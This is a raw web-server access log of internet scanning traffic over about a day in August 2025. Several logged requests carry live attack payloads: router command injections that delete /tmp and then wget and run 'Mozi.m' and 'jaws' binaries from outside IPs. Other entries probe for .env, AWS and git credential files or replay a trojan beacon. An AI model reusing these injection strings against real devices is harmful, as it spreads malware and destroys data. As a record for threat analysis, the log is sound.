+196.251.86.50 - - [05/Aug/2025 12:25:12] "GET / HTTP/1.0" 200 -
+204.76.203.219 - - [05/Aug/2025 12:50:53] "GET / HTTP/1.1" 200 -
+34.77.37.233 - - [05/Aug/2025 12:54:09] "GET / HTTP/1.1" 200 -
+66.240.205.34 - - [05/Aug/2025 14:05:06] code 400, message Bad request version ("x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==")
+66.240.205.34 - - [05/Aug/2025 14:05:06] "[31m[1m145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==[0m" 400 -
+71.6.199.87 - - [05/Aug/2025 14:07:18] "GET / HTTP/1.1" 200 -
+78.153.140.203 - - [05/Aug/2025 14:40:25] "[33mGET /.env HTTP/1.1[0m" 404 -
+78.153.140.203 - - [05/Aug/2025 14:40:25] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00¬\x01\x00\x00¨\x03\x03\x98\x8d,µ>]Dª')
+78.153.140.203 - - [05/Aug/2025 14:40:25] "[31m[1m\x16\x03\x01\x00¬\x01\x00\x00¨\x03\x03\x98\x8d,µ>]Dª \x05\x1bj=í\x06>Ooy®âEf$ã\x17Ýþ©6ó»\x00\x008À,À[0m" 400 -
+78.153.140.203 - - [05/Aug/2025 14:40:25] "[33mGET /api/.env HTTP/1.1[0m" 404 -
+78.153.140.203 - - [05/Aug/2025 14:40:25] "[33mGET /backend/.env HTTP/1.1[0m" 404 -
+78.153.140.203 - - [05/Aug/2025 14:40:26] "[33mGET /admin/.env HTTP/1.1[0m" 404 -
+78.153.140.203 - - [05/Aug/2025 14:40:26] "[33mGET /.env.example HTTP/1.1[0m" 404 -
+78.153.140.203 - - [05/Aug/2025 14:40:26] "[33mGET /app_dev.php/_profiler/phpinfo HTTP/1.1[0m" 404 -
+78.153.140.203 - - [05/Aug/2025 14:40:26] "GET /?phpinfo=-1 HTTP/1.1" 200 -
+78.153.140.203 - - [05/Aug/2025 14:40:26] "[33mGET /stag/.env HTTP/1.1[0m" 404 -
+78.153.140.203 - - [05/Aug/2025 14:40:27] "[33mGET /public_html/.env HTTP/1.1[0m" 404 -
+78.153.140.203 - - [05/Aug/2025 14:40:27] "[33mGET /.env.development HTTP/1.1[0m" 404 -
+78.153.140.203 - - [05/Aug/2025 14:40:27] "[33mGET /portal/.env HTTP/1.1[0m" 404 -
+78.153.140.203 - - [05/Aug/2025 14:40:27] "[33mGET /project/.env HTTP/1.1[0m" 404 -
+78.153.140.203 - - [05/Aug/2025 14:40:27] "[33mGET /.aws/credentials HTTP/1.1[0m" 404 -
+78.153.140.203 - - [05/Aug/2025 14:40:28] "[33mGET /app/config/parameters.yml HTTP/1.1[0m" 404 -
+78.153.140.203 - - [05/Aug/2025 14:40:28] "[33mGET /exapi/.env HTTP/1.1[0m" 404 -
+78.153.140.203 - - [05/Aug/2025 14:40:28] "[33mGET /client_secrets.json HTTP/1.1[0m" 404 -
+78.153.140.203 - - [05/Aug/2025 14:40:28] "[33mGET /pinfo.php HTTP/1.1[0m" 404 -
+41.219.187.170 - - [05/Aug/2025 15:30:40] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [05/Aug/2025 15:54:24] "GET / HTTP/1.1" 200 -
+141.98.11.57 - - [05/Aug/2025 16:02:54] code 400, message Bad request version ('}')
+141.98.11.57 - - [05/Aug/2025 16:02:54] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+144.172.110.50 - - [05/Aug/2025 16:04:04] "GET / HTTP/1.0" 200 -
+20.163.20.206 - - [05/Aug/2025 16:38:34] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [05/Aug/2025 16:39:15] "GET / HTTP/1.1" 200 -
+46.101.246.21 - - [05/Aug/2025 16:49:05] code 400, message Bad request version ('À\x14À')
+46.101.246.21 - - [05/Aug/2025 16:49:05] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x032KdkÕ,\x19´\x9fRê,K²\x94º¡çyÿ«Ô\x16\x902ÐpÌñM<\x85\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+46.101.246.21 - - [05/Aug/2025 16:49:05] code 400, message Bad request version ('À\x14À')
+46.101.246.21 - - [05/Aug/2025 16:49:05] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x9dCk\x84ý\x85L\x89\x88\x13ôËDð\x8a4$½\x0em8\x961\x00\x8a\x8düóÆbÖ<\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+46.101.246.21 - - [05/Aug/2025 16:49:06] "GET / HTTP/1.1" 200 -
+46.101.246.21 - - [05/Aug/2025 16:49:06] "[33mGET /form.html HTTP/1.1[0m" 404 -
+46.101.246.21 - - [05/Aug/2025 16:49:06] "[33mGET /upl.php HTTP/1.1[0m" 404 -
+46.101.246.21 - - [05/Aug/2025 16:49:06] "[33mGET /t4 HTTP/1.1[0m" 404 -
+46.101.246.21 - - [05/Aug/2025 16:49:06] "[33mGET /geoip/ HTTP/1.1[0m" 404 -
+46.101.246.21 - - [05/Aug/2025 16:49:06] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+46.101.246.21 - - [05/Aug/2025 16:49:06] "[33mGET /1.php HTTP/1.1[0m" 404 -
+46.101.246.21 - - [05/Aug/2025 16:49:06] "[33mGET /systembc/password.php HTTP/1.1[0m" 404 -
+46.101.246.21 - - [05/Aug/2025 16:49:07] "[33mGET /password.php HTTP/1.1[0m" 404 -
+80.75.212.17 - - [05/Aug/2025 17:06:42] "[33mCONNECT httpbin.org:443 HTTP/1.1[0m" 404 -
+91.224.92.17 - - [05/Aug/2025 17:15:57] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [05/Aug/2025 18:18:53] "GET / HTTP/1.1" 200 -
+196.251.86.50 - - [05/Aug/2025 18:40:41] "GET / HTTP/1.0" 200 -
+185.242.226.99 - - [05/Aug/2025 19:19:38] code 400, message Bad request version ('À\x14À')
+185.242.226.99 - - [05/Aug/2025 19:19:38] "[31m[1m\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03[ñ¼\x1b\x14dI£~\x7fz¬ÁÝ\x973É¤\x1dlyÐÉ¦ÙuÖ\x04@Ô\x1f²\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+134.209.174.123 - - [05/Aug/2025 19:22:26] "GET / HTTP/1.1" 200 -
+134.209.174.123 - - [05/Aug/2025 19:22:26] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+196.251.66.71 - - [05/Aug/2025 19:46:07] code 400, message Bad request syntax ('\x05\x01\x00')
+196.251.66.71 - - [05/Aug/2025 19:46:07] "[31m[1m\x05\x01\x00[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:46:36] code 400, message Bad request syntax ('\x04\x01\x00PÄûBG\x00')
+196.251.66.71 - - [05/Aug/2025 19:46:36] "[31m[1m\x04\x01\x00PÄûBG\x00[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:46:42] "[33mCONNECT 196.251.66.71:80 HTTP/1.0[0m" 404 -
+196.251.66.71 - - [05/Aug/2025 19:46:51] code 400, message Bad request syntax ('SSH-2.0-libssh_0.11.1')
+196.251.66.71 - - [05/Aug/2025 19:46:51] "[31m[1mSSH-2.0-libssh_0.11.1[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:47:02] code 400, message Bad request syntax ('SSH-2.0-libssh_0.11.1')
+196.251.66.71 - - [05/Aug/2025 19:47:02] "[31m[1mSSH-2.0-libssh_0.11.1[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:47:09] code 400, message Bad request syntax ('SSH-2.0-libssh_0.11.1')
+196.251.66.71 - - [05/Aug/2025 19:47:09] "[31m[1mSSH-2.0-libssh_0.11.1[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:47:15] code 400, message Bad request syntax ('SSH-2.0-libssh_0.11.1')
+196.251.66.71 - - [05/Aug/2025 19:47:15] "[31m[1mSSH-2.0-libssh_0.11.1[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:47:29] code 400, message Bad request syntax ('SSH-2.0-libssh_0.11.1')
+196.251.66.71 - - [05/Aug/2025 19:47:29] "[31m[1mSSH-2.0-libssh_0.11.1[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:47:35] code 400, message Bad request syntax ('SSH-2.0-libssh_0.11.1')
+196.251.66.71 - - [05/Aug/2025 19:47:35] "[31m[1mSSH-2.0-libssh_0.11.1[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:47:46] code 400, message Bad request syntax ('SSH-2.0-libssh_0.11.1')
+196.251.66.71 - - [05/Aug/2025 19:47:46] "[31m[1mSSH-2.0-libssh_0.11.1[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:47:52] code 400, message Bad request syntax ('SSH-2.0-libssh_0.11.1')
+196.251.66.71 - - [05/Aug/2025 19:47:52] "[31m[1mSSH-2.0-libssh_0.11.1[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:48:00] code 400, message Bad request syntax ('SSH-2.0-libssh_0.11.1')
+196.251.66.71 - - [05/Aug/2025 19:48:00] "[31m[1mSSH-2.0-libssh_0.11.1[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:48:08] code 400, message Bad request syntax ('SSH-2.0-libssh_0.11.1')
+196.251.66.71 - - [05/Aug/2025 19:48:08] "[31m[1mSSH-2.0-libssh_0.11.1[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:48:15] code 400, message Bad request syntax ('SSH-2.0-libssh_0.11.1')
+196.251.66.71 - - [05/Aug/2025 19:48:15] "[31m[1mSSH-2.0-libssh_0.11.1[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:48:20] code 400, message Bad request syntax ('SSH-2.0-libssh_0.11.1')
+196.251.66.71 - - [05/Aug/2025 19:48:20] "[31m[1mSSH-2.0-libssh_0.11.1[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:48:29] code 400, message Bad request syntax ('SSH-2.0-libssh_0.11.1')
+196.251.66.71 - - [05/Aug/2025 19:48:29] "[31m[1mSSH-2.0-libssh_0.11.1[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:48:36] code 400, message Bad request syntax ('SSH-2.0-libssh_0.11.1')
+196.251.66.71 - - [05/Aug/2025 19:48:36] "[31m[1mSSH-2.0-libssh_0.11.1[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:48:53] code 400, message Bad request syntax ('SSH-2.0-libssh_0.11.1')
+196.251.66.71 - - [05/Aug/2025 19:48:53] "[31m[1mSSH-2.0-libssh_0.11.1[0m" 400 -
+196.251.66.71 - - [05/Aug/2025 19:48:58] code 400, message Bad request syntax ('SSH-2.0-libssh_0.11.1')
+196.251.66.71 - - [05/Aug/2025 19:48:58] "[31m[1mSSH-2.0-libssh_0.11.1[0m" 400 -
+204.76.203.219 - - [05/Aug/2025 19:54:48] "GET / HTTP/1.1" 200 -
+182.127.152.156 - - [05/Aug/2025 20:13:55] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.127.152.156:42816/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+149.50.96.114 - - [05/Aug/2025 20:26:09] "GET / HTTP/1.1" 200 -
+3.82.99.229 - - [05/Aug/2025 20:43:14] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [05/Aug/2025 21:09:20] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+185.170.144.3 - - [05/Aug/2025 21:09:52] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.170.144.3 - - [05/Aug/2025 21:09:52] "[31m[1m\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr[0m" 400 -
+147.185.132.115 - - [05/Aug/2025 21:18:37] "GET / HTTP/1.0" 200 -
+91.224.92.17 - - [05/Aug/2025 21:34:27] "GET / HTTP/1.1" 200 -
+141.98.11.57 - - [05/Aug/2025 21:35:25] code 400, message Bad request version ('}')
+141.98.11.57 - - [05/Aug/2025 21:35:25] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+185.242.226.99 - - [05/Aug/2025 21:42:38] "GET / HTTP/1.1" 200 -
+144.172.110.50 - - [05/Aug/2025 21:51:11] "GET / HTTP/1.0" 200 -
+79.124.58.198 - - [05/Aug/2025 22:37:06] "[33mGET /actuator/gateway/routes HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:48:58] "[33mGET /.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:48:58] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00¬\x01\x00\x00¨\x03\x03r\x9a\x84\x07K')
+78.153.140.151 - - [05/Aug/2025 22:48:58] "[31m[1m\x16\x03\x01\x00¬\x01\x00\x00¨\x03\x03r\x9a\x84\x07K\x0d9Ò!Ñ\x981[0m" 400 -
+78.153.140.151 - - [05/Aug/2025 22:48:58] "[33mGET /core/.env.key HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:48:59] "[33mGET /data/env.json HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:48:59] "[33mGET /core/.env.log HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:48:59] "[33mGET /core/.env.old HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:00] "[33mGET /core/.env.pem HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:00] "[33mGET /dev/.env.smtp HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:01] "[33mGET /dev/.env.test HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:01] "[33mGET /django/env.py HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:01] "[33mGET /docs/.env.aws HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:02] "[33mGET /docs/.env.bak HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:02] "[33mGET /docs/.env.crt HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:02] "[33mGET /docs/.env.dev HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:02] "[33mGET /core/.env.tmp HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:03] "[33mGET /docs/.env.gcp HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:03] "[33mGET /core/.env.uat HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:03] "[33mGET /docs/.env.key HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:04] "[33mGET /docs/.env.log HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:04] "[33mGET /docs/.env.old HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:05] "[33mGET /docs/.env.pem HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:05] "[33mGET /docs/.env.tmp HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:05] "[33mGET /docs/.env.uat HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:05] "[33mGET /env.config.js HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:06] "[33mGET /env/debug.txt HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:06] "[33mGET /mail/.env.old HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:06] "[33mGET /env/mail.conf HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:07] "[33mGET /env/mail.yaml HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:07] "[33mGET /crm/.env.dist HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:07] "[33mGET /env/main.conf HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:07] "[33mGET /env/relay.bak HTTP/1.1[0m" 404 -
+78.153.140.151 - - [05/Aug/2025 22:49:08] "[33mGET /env/relay.log HTTP/1.1[0m" 404 -
+204.76.203.219 - - [05/Aug/2025 23:07:37] "GET / HTTP/1.1" 200 -
+159.223.23.251 - - [05/Aug/2025 23:20:51] "[33mGET /.env HTTP/1.1[0m" 404 -
+159.223.23.251 - - [05/Aug/2025 23:20:51] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+79.124.58.198 - - [05/Aug/2025 23:25:54] code 400, message Bad request syntax ('\x16\x03\x01\x05¨\x01\x00\x05¤\x03\x03÷ìjÜ?öÕ¸=çô\x8ca¯nëÌ\x90´')
+79.124.58.198 - - [05/Aug/2025 23:25:54] "[31m[1m\x16\x03\x01\x05¨\x01\x00\x05¤\x03\x03÷ìjÜ?öÕ¸=çô\x8ca¯nëÌ\x90´[0m" 400 -
+149.50.96.5 - - [05/Aug/2025 23:28:25] "GET / HTTP/1.1" 200 -
+198.235.24.220 - - [05/Aug/2025 23:30:13] code 400, message Bad request version ('À\x13À')
+198.235.24.220 - - [05/Aug/2025 23:30:13] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¿¢Ðpu:fòß,NòÔn\x93ÕN¶z!ò\x15ñ\x1cÌ\x82u\x01ãx\x06÷ |Ã\x05^N´èà_wÇv&\x1aù\x056tã<­\x81Ö-e40Åúûå\x8d\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+198.235.24.220 - - [05/Aug/2025 23:30:13] code 400, message Bad request version ('À(À$À\x14À')
+198.235.24.220 - - [05/Aug/2025 23:30:13] "[31m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03Q+JU®ÉZÜGÎ\x8b\x0f¬ªY÷\x06\x1fgªû8O9Ò:Â¢\x8c\x04\x95ô\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À[0m" 400 -
+91.224.92.17 - - [05/Aug/2025 23:33:34] "GET / HTTP/1.1" 200 -
+149.50.96.114 - - [05/Aug/2025 23:57:23] "GET / HTTP/1.1" 200 -
+93.174.93.12 - - [06/Aug/2025 00:23:04] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+93.174.93.12 - - [06/Aug/2025 00:23:04] "[31m[1m\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À[0m" 400 -
+46.19.141.90 - - [06/Aug/2025 00:25:03] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+149.50.96.5 - - [06/Aug/2025 00:38:59] "[33mGET /page/style/index.css HTTP/1.1[0m" 404 -
+91.224.92.17 - - [06/Aug/2025 01:15:01] "GET / HTTP/1.1" 200 -
+45.135.194.136 - - [06/Aug/2025 01:20:57] "GET / HTTP/1.1" 200 -
+45.79.128.205 - - [06/Aug/2025 01:53:18] code 400, message Bad request syntax ('\x16\x03\x01\x01')
+45.79.128.205 - - [06/Aug/2025 01:53:18] "[31m[1m\x16\x03\x01\x01[0m" 400 -
+45.79.128.205 - - [06/Aug/2025 01:53:19] code 400, message Bad request syntax ('\x16\x03\x01\x01')
+45.79.128.205 - - [06/Aug/2025 01:53:19] "[31m[1m\x16\x03\x01\x01[0m" 400 -
+93.174.93.12 - - [06/Aug/2025 01:55:15] "GET / HTTP/1.0" 200 -
+149.50.96.5 - - [06/Aug/2025 02:13:19] "[33mGET /userRpmNatDebugRpm26525557/start_art.html HTTP/1.1[0m" 404 -
+64.62.156.52 - - [06/Aug/2025 02:32:42] "GET / HTTP/1.1" 200 -
+64.62.156.65 - - [06/Aug/2025 02:36:49] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+64.62.156.52 - - [06/Aug/2025 02:37:33] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+184.105.247.195 - - [06/Aug/2025 02:54:35] code 400, message Bad request version ('À\x14À')
+184.105.247.195 - - [06/Aug/2025 02:54:35] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03SàtLÊ\x99\x95«kºKþaÆ\x1c%ö~\x1b1\x9df¼î@ÛLµ÷\x86â«\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+17.241.75.4 - - [06/Aug/2025 03:02:26] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+68.69.186.238 - - [06/Aug/2025 03:09:14] "GET / HTTP/1.1" 200 -
+40.124.174.199 - - [06/Aug/2025 03:12:50] code 400, message Bad request syntax ('MGLNDD_83.216.144.139_80')
+40.124.174.199 - - [06/Aug/2025 03:12:50] "[31m[1mMGLNDD_83.216.144.139_80[0m" 400 -
+204.76.203.219 - - [06/Aug/2025 03:14:09] "GET / HTTP/1.1" 200 -
+89.248.173.219 - - [06/Aug/2025 03:24:52] "GET / HTTP/1.1" 200 -
+141.98.11.57 - - [06/Aug/2025 03:51:53] code 400, message Bad request version ('}')
+141.98.11.57 - - [06/Aug/2025 03:51:53] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+91.224.92.17 - - [06/Aug/2025 04:00:34] "GET / HTTP/1.1" 200 -
+51.159.214.49 - - [06/Aug/2025 04:03:51] "HEAD / HTTP/1.1" 200 -
+51.159.214.49 - - [06/Aug/2025 04:03:58] "GET / HTTP/1.1" 200 -
+51.159.214.49 - - [06/Aug/2025 04:03:58] "GET /static/css/style.css HTTP/1.1" 200 -
+51.159.214.49 - - [06/Aug/2025 04:03:59] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+51.159.214.49 - - [06/Aug/2025 04:04:00] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+51.159.214.49 - - [06/Aug/2025 04:04:01] "[33mGET /ads.txt HTTP/1.1[0m" 404 -
+51.159.214.49 - - [06/Aug/2025 04:04:01] "[33mGET /app-ads.txt HTTP/1.1[0m" 404 -
+51.159.214.49 - - [06/Aug/2025 04:04:01] "[33mGET /sellers.json HTTP/1.1[0m" 404 -
+41.40.242.179 - - [06/Aug/2025 04:06:39] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1')
+41.40.242.179 - - [06/Aug/2025 04:06:39] "[31m[1mGET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1[0m" 400 -
+91.224.92.17 - - [06/Aug/2025 04:22:34] "GET / HTTP/1.1" 200 -
+149.50.96.114 - - [06/Aug/2025 04:36:18] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [06/Aug/2025 05:03:27] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+207.154.228.153 - - [06/Aug/2025 05:15:46] "GET / HTTP/1.0" 200 -
+207.154.228.153 - - [06/Aug/2025 05:15:47] "GET / HTTP/1.0" 200 -
+207.154.228.153 - - [06/Aug/2025 05:15:47] "[33mPOST /sdk HTTP/1.1[0m" 404 -
+207.154.228.153 - - [06/Aug/2025 05:15:47] "[33mGET /odinhttpcall1754457346 HTTP/1.1[0m" 404 -
+207.154.228.153 - - [06/Aug/2025 05:15:47] "[33mGET /evox/about HTTP/1.1[0m" 404 -
+207.154.228.153 - - [06/Aug/2025 05:15:47] "[33mGET /HNAP1 HTTP/1.1[0m" 404 -
+207.154.228.153 - - [06/Aug/2025 05:15:47] "GET / HTTP/1.0" 200 -
+207.154.228.153 - - [06/Aug/2025 05:15:47] "GET / HTTP/1.1" 200 -
+104.248.29.128 - - [06/Aug/2025 05:15:47] "[33mGET /v2/_catalog HTTP/1.1[0m" 404 -
+165.22.69.175 - - [06/Aug/2025 05:15:48] "[33mGET /query?q=SHOW+DIAGNOSTICS HTTP/1.1[0m" 404 -
+104.248.29.128 - - [06/Aug/2025 05:15:48] "[33mGET /cgi-bin/authLogin.cgi HTTP/1.1[0m" 404 -
+165.22.69.175 - - [06/Aug/2025 05:15:48] "GET / HTTP/1.1" 200 -
+167.71.40.115 - - [06/Aug/2025 05:15:48] "[33mGET /solr/admin/info/system HTTP/1.1[0m" 404 -
+207.154.209.233 - - [06/Aug/2025 05:15:48] code 400, message Bad request version ('À\x13À')
+207.154.209.233 - - [06/Aug/2025 05:15:48] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03²»\x18!µ\x83\x9d\x14¯Y\x11\x83æâm_70\x95\x95E¼\x9aº(3Q'X !³ Ûçý³½.E[´ rön¬\x97±V1½O«_êÛ\x94\x19^Ú\x8e½Ã$\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+167.71.40.115 - - [06/Aug/2025 05:15:48] "[33mGET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1[0m" 404 -
+207.154.209.233 - - [06/Aug/2025 05:15:48] code 400, message Bad request version ('À\x13À')
+207.154.209.233 - - [06/Aug/2025 05:15:48] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x036á^\x19A\x85m\x0e\x9ew)ê\x03\x80Åµ\x01±¾p¡¶\x86%lõ\x01P\x00¨yþ \x0f9u\x8a*º\x0c\x19p\x89¼\x09þVù\x88\x19Ûl3ßÊ°Á:\x86\x12\\Üq\x83u\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+128.199.164.57 - - [06/Aug/2025 05:15:48] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+45.135.194.136 - - [06/Aug/2025 05:36:15] "GET / HTTP/1.1" 200 -
+164.92.235.213 - - [06/Aug/2025 05:39:17] code 400, message Bad request version ("ÌÞE\x04öA{\x84\x16ñáLó×\x9eR\x9a©\x89¬\x13\x05\x8f-\x90ßG#Ä\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+164.92.235.213 - - [06/Aug/2025 05:39:17] "[31m[1m\x16\x03\x01\x01$\x01\x00\x01 \x03\x03nX³\x88\x9dý­\x95¡\x0bÕ\x92æ«í\x1b1zCæ<÷<ð\x98Dt\x0e\x1a¥#\x19 \x9a\x0e ÌÞE\x04öA{\x84\x16ñáLó×\x9eR\x9a©\x89¬\x13\x05\x8f-\x90ßG#Ä\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ[0m" 400 -
+103.20.102.84 - - [06/Aug/2025 05:44:26] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+164.92.135.157 - - [06/Aug/2025 06:07:17] "GET / HTTP/1.0" 200 -
+164.92.135.157 - - [06/Aug/2025 06:07:17] "[33mGET /odinhttpcall1754460437 HTTP/1.1[0m" 404 -
+164.92.135.157 - - [06/Aug/2025 06:07:17] "[33mPOST /sdk HTTP/1.1[0m" 404 -
+164.92.135.157 - - [06/Aug/2025 06:07:17] "GET / HTTP/1.0" 200 -
+164.92.135.157 - - [06/Aug/2025 06:07:17] "[33mGET /HNAP1 HTTP/1.1[0m" 404 -
+164.92.135.157 - - [06/Aug/2025 06:07:17] "[33mGET /evox/about HTTP/1.1[0m" 404 -
+164.92.135.157 - - [06/Aug/2025 06:07:17] "GET / HTTP/1.0" 200 -
+164.92.135.157 - - [06/Aug/2025 06:07:18] "GET / HTTP/1.1" 200 -
+206.81.27.120 - - [06/Aug/2025 06:07:18] "[33mGET /solr/admin/info/system HTTP/1.1[0m" 404 -
+207.154.209.233 - - [06/Aug/2025 06:07:18] "GET / HTTP/1.1" 200 -
+167.172.165.7 - - [06/Aug/2025 06:07:18] "[33mGET /cgi-bin/authLogin.cgi HTTP/1.1[0m" 404 -
+164.92.235.213 - - [06/Aug/2025 06:07:18] code 400, message Bad request version ('À\x13À')
